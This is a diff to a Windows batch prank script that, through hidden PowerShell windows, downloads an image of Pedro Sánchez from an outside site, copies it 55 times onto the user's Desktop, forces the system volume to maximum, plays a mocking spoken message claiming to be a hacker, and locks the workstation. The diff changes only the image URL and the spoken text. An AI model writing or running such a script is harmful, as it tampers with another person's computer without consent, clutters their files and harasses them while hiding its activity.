@@ -1,8 +1,8 @@
 @echo off
 
-powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://album.mediaset.es/eimg/2024/04/26/la-carta-de-pedro-sanchez-y-los-memes-mas-virales-asi-reaccionan-las-redes-a-su-periodo-de-reflexion_047e.jpg' -OutFile \"$env:TEMP\pedro.png\""
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://pbs.twimg.com/media/CG_6R6hXAAEnowm.jpg' -OutFile \"$env:TEMP\pedro.png\""
 
-start "" "https://album.mediaset.es/eimg/2024/04/26/la-carta-de-pedro-sanchez-y-los-memes-mas-virales-asi-reaccionan-las-redes-a-su-periodo-de-reflexion_047e.jpg"
+start "" "https://pbs.twimg.com/media/CG_6R6hXAAEnowm.jpg"
 
 powershell -WindowStyle Hidden -Command "for ($i = 1; $i -le 55; $i++) { Copy-Item -Path \"$env:TEMP\pedro.png\" -Destination \"C:\Users\$env:USERNAME\Desktop\pedro$i.png\" }"
 
@@ -15,6 +15,6 @@ if not exist "%NIR%" (
 "%NIR%" mutesysvolume 0
 "%NIR%" setsysvolume 65535
 
-powershell -WindowStyle Hidden -NoProfile -Command "Add-Type -AssemblyName System.Speech; $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer; $speak.Volume = 100; $speak.Speak('Pedro Sanchez. Lol. Es mexicano.');"
+powershell -WindowStyle Hidden -NoProfile -Command "Add-Type -AssemblyName System.Speech; $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer; $speak.Volume = 100; $speak.Speak('Hola, soy un hacker. Tengo un windows en un mac. KALISE PARA TODOS.');"
 
 rundll32.exe user32.dll,LockWorkStation
